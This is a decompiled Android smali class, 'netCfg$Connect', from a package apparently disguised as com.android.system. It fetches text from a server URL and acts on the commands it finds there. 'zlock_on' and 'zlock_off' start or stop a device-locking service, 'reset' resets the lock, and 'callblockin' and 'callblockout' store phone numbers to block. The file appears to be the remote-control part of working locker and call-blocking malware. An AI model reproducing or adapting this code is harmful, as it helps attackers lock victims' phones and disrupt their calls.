.class Lcom/android/system/netCfg$Connect;
.super Landroid/os/AsyncTask;
.source "netCfg.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/android/system/netCfg;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = "Connect"
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask",
        "<",
        "Ljava/lang/String;",
        "Ljava/lang/String;",
        "Ljava/lang/String;",
        ">;"
    }
.end annotation


# instance fields
.field final synthetic this$0:Lcom/android/system/netCfg;


# direct methods
.method constructor <init>(Lcom/android/system/netCfg;)V
    .locals 0

    .prologue
    .line 161
    iput-object p1, p0, Lcom/android/system/netCfg$Connect;->this$0:Lcom/android/system/netCfg;

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    return-void
.end method


# virtual methods
.method protected bridge varargs synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1

    .prologue
    .line 1
    check-cast p1, [Ljava/lang/String;

    invoke-virtual {p0, p1}, Lcom/android/system/netCfg$Connect;->doInBackground([Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method protected varargs doInBackground([Ljava/lang/String;)Ljava/lang/String;
    .locals 7
    .param p1, "uri"    # [Ljava/lang/String;

    .prologue
    .line 165
    new-instance v0, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v0}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    .line 167
    .local v0, "httpclient":Lorg/apache/http/client/HttpClient;
    const/4 v3, 0x0

    .line 169
    .local v3, "responseString":Ljava/lang/String;
    :try_start_0
    new-instance v5, Lorg/apache/http/client/methods/HttpGet;

    const/4 v6, 0x0

    aget-object v6, p1, v6

    invoke-direct {v5, v6}, Lorg/apache/http/client/methods/HttpGet;-><init>(Ljava/lang/String;)V

    invoke-interface {v0, v5}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v2

    .line 170
    .local v2, "response":Lorg/apache/http/HttpResponse;
    invoke-interface {v2}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v4

    .line 171
    .local v4, "statusLine":Lorg/apache/http/StatusLine;
    invoke-interface {v4}, Lorg/apache/http/StatusLine;->getStatusCode()I

    move-result v5

    const/16 v6, 0xc8

    if-ne v5, v6, :cond_0

    .line 172
    new-instance v1, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v1}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 173
    .local v1, "out":Ljava/io/ByteArrayOutputStream;
    invoke-interface {v2}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v5

    invoke-interface {v5, v1}, Lorg/apache/http/HttpEntity;->writeTo(Ljava/io/OutputStream;)V

    .line 174
    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->close()V

    .line 175
    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->toString()Ljava/lang/String;

    move-result-object v3

    .line 183
    .end local v1    # "out":Ljava/io/ByteArrayOutputStream;
    .end local v2    # "response":Lorg/apache/http/HttpResponse;
    .end local v4    # "statusLine":Lorg/apache/http/StatusLine;
    :goto_0
    return-object v3

    .line 177
    .restart local v2    # "response":Lorg/apache/http/HttpResponse;
    .restart local v4    # "statusLine":Lorg/apache/http/StatusLine;
    :cond_0
    invoke-interface {v2}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v5

    invoke-interface {v5}, Lorg/apache/http/HttpEntity;->getContent()Ljava/io/InputStream;

    move-result-object v5

    invoke-virtual {v5}, Ljava/io/InputStream;->close()V

    .line 178
    new-instance v5, Ljava/io/IOException;

    invoke-interface {v4}, Lorg/apache/http/StatusLine;->getReasonPhrase()Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/io/IOException;-><init>(Ljava/lang/String;)V

    throw v5
    :try_end_0
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1

    .line 180
    .end local v2    # "response":Lorg/apache/http/HttpResponse;
    .end local v4    # "statusLine":Lorg/apache/http/StatusLine;
    :catch_0
    move-exception v5

    goto :goto_0

    .line 181
    :catch_1
    move-exception v5

    goto :goto_0
.end method

.method protected bridge synthetic onPostExecute(Ljava/lang/Object;)V
    .locals 0

    .prologue
    .line 1
    check-cast p1, Ljava/lang/String;

    invoke-virtual {p0, p1}, Lcom/android/system/netCfg$Connect;->onPostExecute(Ljava/lang/String;)V

    return-void
.end method

.method protected onPostExecute(Ljava/lang/String;)V
    .locals 7
    .param p1, "answer"    # Ljava/lang/String;

    .prologue
    const/4 v6, 0x1

    .line 188
    invoke-super {p0, p1}, Landroid/os/AsyncTask;->onPostExecute(Ljava/lang/Object;)V

    .line 192
    invoke-virtual {p1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object p1

    .line 194
    if-eqz p1, :cond_4

    .line 196
    const-string v2, "zlock_on"

    invoke-virtual {p1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 197
    new-instance v2, Lcom/android/system/IO;

    invoke-direct {v2}, Lcom/android/system/IO;-><init>()V

    const-string v3, "zlock"

    const-string v4, "start"

    iget-object v5, p0, Lcom/android/system/netCfg$Connect;->this$0:Lcom/android/system/netCfg;

    iget-object v5, v5, Lcom/android/system/netCfg;->cc:Landroid/content/Context;

    invoke-virtual {v2, v3, v4, v5}, Lcom/android/system/IO;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 198
    iget-object v2, p0, Lcom/android/system/netCfg$Connect;->this$0:Lcom/android/system/netCfg;

    iget-object v2, v2, Lcom/android/system/netCfg;->cc:Landroid/content/Context;

    new-instance v3, Landroid/content/Intent;

    iget-object v4, p0, Lcom/android/system/netCfg$Connect;->this$0:Lcom/android/system/netCfg;

    iget-object v4, v4, Lcom/android/system/netCfg;->cc:Landroid/content/Context;

    const-class v5, Lcom/android/system/LockSvc;

    invoke-direct {v3, v4, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v2, v3}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 201
    :cond_0
    const-string v2, "zlock_off"

    invoke-virtual {p1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_1

    .line 202
    new-instance v2, Lcom/android/system/IO;

    invoke-direct {v2}, Lcom/android/system/IO;-><init>()V

    const-string v3, "zlock"

    const-string v4, "stop"

    iget-object v5, p0, Lcom/android/system/netCfg$Connect;->this$0:Lcom/android/system/netCfg;

    iget-object v5, v5, Lcom/android/system/netCfg;->cc:Landroid/content/Context;

    invoke-virtual {v2, v3, v4, v5}, Lcom/android/system/IO;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 203
    new-instance v2, Lcom/android/system/IO;

    invoke-direct {v2}, Lcom/android/system/IO;-><init>()V

    const-string v3, "i"

    const-string v4, "123456123456"

    iget-object v5, p0, Lcom/android/system/netCfg$Connect;->this$0:Lcom/android/system/netCfg;

    iget-object v5, v5, Lcom/android/system/netCfg;->cc:Landroid/content/Context;

    invoke-virtual {v2, v3, v4, v5}, Lcom/android/system/IO;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 204
    new-instance v2, Lcom/android/system/IO;

    invoke-direct {v2}, Lcom/android/system/IO;-><init>()V

    const-string v3, "c"

    const-string v4, "123456123456"

    iget-object v5, p0, Lcom/android/system/netCfg$Connect;->this$0:Lcom/android/system/netCfg;

    iget-object v5, v5, Lcom/android/system/netCfg;->cc:Landroid/content/Context;

    invoke-virtual {v2, v3, v4, v5}, Lcom/android/system/IO;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 207
    :cond_1
    const-string v2, "reset"

    invoke-virtual {p1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_2

    .line 208
    new-instance v2, Lcom/android/system/IO;

    invoke-direct {v2}, Lcom/android/system/IO;-><init>()V

    const-string v3, "zlock"

    const-string v4, "reset"

    iget-object v5, p0, Lcom/android/system/netCfg$Connect;->this$0:Lcom/android/system/netCfg;

    iget-object v5, v5, Lcom/android/system/netCfg;->cc:Landroid/content/Context;

    invoke-virtual {v2, v3, v4, v5}, Lcom/android/system/IO;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 211
    :cond_2
    const-string v2, "callblockin"

    invoke-virtual {p1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_3

    .line 212
    const-string v2, " "

    invoke-virtual {p1, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 213
    .local v0, "D":[Ljava/lang/String;
    aget-object v1, v0, v6

    .line 214
    .local v1, "Data":Ljava/lang/String;
    new-instance v2, Lcom/android/system/IO;

    invoke-direct {v2}, Lcom/android/system/IO;-><init>()V

    const-string v3, "i"

    iget-object v4, p0, Lcom/android/system/netCfg$Connect;->this$0:Lcom/android/system/netCfg;

    iget-object v4, v4, Lcom/android/system/netCfg;->cc:Landroid/content/Context;

    invoke-virtual {v2, v3, v1, v4}, Lcom/android/system/IO;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 217
    .end local v0    # "D":[Ljava/lang/String;
    .end local v1    # "Data":Ljava/lang/String;
    :cond_3
    const-string v2, "callblockout"

    invoke-virtual {p1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_4

    .line 218
    const-string v2, " "

    invoke-virtual {p1, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 219
    .restart local v0    # "D":[Ljava/lang/String;
    aget-object v1, v0, v6

    .line 220
    .restart local v1    # "Data":Ljava/lang/String;
    new-instance v2, Lcom/android/system/IO;

    invoke-direct {v2}, Lcom/android/system/IO;-><init>()V

    const-string v3, "c"

    iget-object v4, p0, Lcom/android/system/netCfg$Connect;->this$0:Lcom/android/system/netCfg;

    iget-object v4, v4, Lcom/android/system/netCfg;->cc:Landroid/content/Context;

    invoke-virtual {v2, v3, v1, v4}, Lcom/android/system/IO;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 225
    .end local v0    # "D":[Ljava/lang/String;
    .end local v1    # "Data":Ljava/lang/String;
    :cond_4
    return-void
.end method
